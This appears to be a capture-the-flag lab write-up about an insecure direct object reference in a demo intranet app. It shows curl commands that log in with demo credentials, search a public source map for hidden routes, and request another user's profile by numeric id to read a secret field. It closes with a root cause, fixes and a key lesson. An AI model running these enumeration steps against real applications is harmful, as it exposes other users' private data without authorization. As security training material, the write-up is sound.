# Acme Intranet Session-Tied IDOR Bypass

## What Is Happening

Acme Intranet logs in `demo/demo`, stores a signed session cookie containing `{"uid":42}`, and renders the signed-in user's profile from a session-derived “me” endpoint.

The challenge claims the user id is tied to the session and cannot be tampered with. That is true for the primary profile route, but a second (often dormant) endpoint still accepts a raw numeric user id and returns a sensitive `secret` field.

Two packaging variants exist:

| Variant | Client surface | IDOR endpoint |
|---------|----------------|---------------|
| Separate modules | `/js/team.js` comments | `GET /api/teamMemberInfo/<id>` |
| Single esbuild bundle + public map | `/js/app.bundle.js` + `.map` | `GET /api/v1/admin/profile?principal=<id>` |

## Why It Happens

The “me” route derives the current user from the signed `session` cookie. Tampering the cookie or dropping `session.sig` returns `401`.

A dormant admin/team helper still documents an id-based lookup that returns `{ id, username, name, email, title, secret }` with no ownership check. Any authenticated user can request another member by changing the id.

The dashboard announcement names **Mira (#1, admin)**, giving a high-value enumeration target.

## Exploit Chain

1. Log in as `demo/demo`.
2. Recon JavaScript: separate modules **or** `app.bundle.js` + `app.bundle.js.map` `sourcesContent`.
3. Call the dormant id-based profile endpoint with `principal`/`id` = `1`.
4. Read the `secret` field.

## Exact Test

### Variant A — path id (`teamMemberInfo`)

```bash
curl -sS -c /tmp/cj -X POST 'https://[host]/api/login' \
  -H 'content-type: application/json' \
  -d '{"username":"demo","password":"demo"}'

curl -sS -b /tmp/cj 'https://[host]/api/teamMemberInfo/1'
```

### Variant B — source map + query `principal`

```bash
curl -sS -c /tmp/cj -X POST 'https://[host]/api/login' \
  -H 'content-type: application/json' \
  -d '{"username":"demo","password":"demo"}'

curl -sS -b /tmp/cj 'https://[host]/js/app.bundle.js.map' \
  | jq -r '.sourcesContent[]' | grep -n 'admin/profile\|principal\|secret'

curl -sS -b /tmp/cj 'https://[host]/api/v1/user/me'
curl -sS -b /tmp/cj 'https://[host]/api/v1/admin/profile?principal=1'
```

Control — session-bound profile has no secret:

```bash
curl -sS -b /tmp/cj 'https://[host]/api/me'          # older instances
curl -sS -b /tmp/cj 'https://[host]/api/v1/user/me'  # bundle instances
```

## Expected Signal

- “me” returns only the signed-in user's public profile fields.
- Own id on the alternate endpoint returns a placeholder secret.
- Id `1` (Mira) returns admin data including `pwnbox{...}` in `secret`.
- Forged session cookies are rejected on the “me” route.

## Result Interpretation

```text
Signed session protects /api/.../me
-> developer assumes id cannot be abused
-> dormant team/admin profile API accepts arbitrary ids
-> no ownership check on alternate endpoint
-> horizontal/vertical read of secret field
```

Minifying into one bundle does **not** remove the bug if unused modules remain in the build and the source map (or comments) still document the route.

## Root Cause

Authorization was implemented on one endpoint but not across all routes that reference user objects by id (path or query).

## Impact

- Read other users' profile data and sensitive `secret` values.
- In real systems, similar endpoints may expose SSNs, salary, tokens, internal notes, or admin-only fields.

## Fix

- Enforce object-level authorization on every id-parameter endpoint.
- Return sensitive fields only when `requested_id == session_user_id` or the caller has an explicit admin role.
- Remove unused APIs from production bundles; disable public source maps.
- Add regression tests for all object-reference routes, not only the main profile API.

## Key Lesson

Securing the "main" profile route does not secure the application. If any endpoint still accepts a user-controlled id — including oddly named params like `principal` — test it for IDOR even when the developer claims ids are session-bound elsewhere. Always fetch `.js.map` next to minified bundles.

## Confirmed Instances

| Date | Host | Variant | IDOR |
|------|------|---------|------|
| 2026-07-08 | `2060640a8540.pwnbox-lab.com` | separate `team.js` | `/api/teamMemberInfo/1` |
| 2026-07-09 | `5f1d21017a49.pwnbox-lab.com` | `app.bundle.js.map` | `/api/v1/admin/profile?principal=1` |

Live flags omitted from reusable notes; see dated `labs/` entries for instance work.
